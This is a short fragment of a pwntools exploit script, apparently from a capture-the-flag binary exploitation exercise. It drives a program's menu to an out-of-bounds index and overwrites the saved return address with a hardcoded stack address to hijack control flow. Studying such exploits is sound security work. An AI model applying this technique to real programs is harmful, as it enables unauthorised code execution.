...
p.sendline(b"1")
p.sendline(b"13")
# since its a precise overwrite, we jump straight to people[13]
p.sendline(b"")  # nothing there, we could overwrite RBP with this input
p.sendline(p64(0x7FFFFFFFE320))  # overwrite RIP
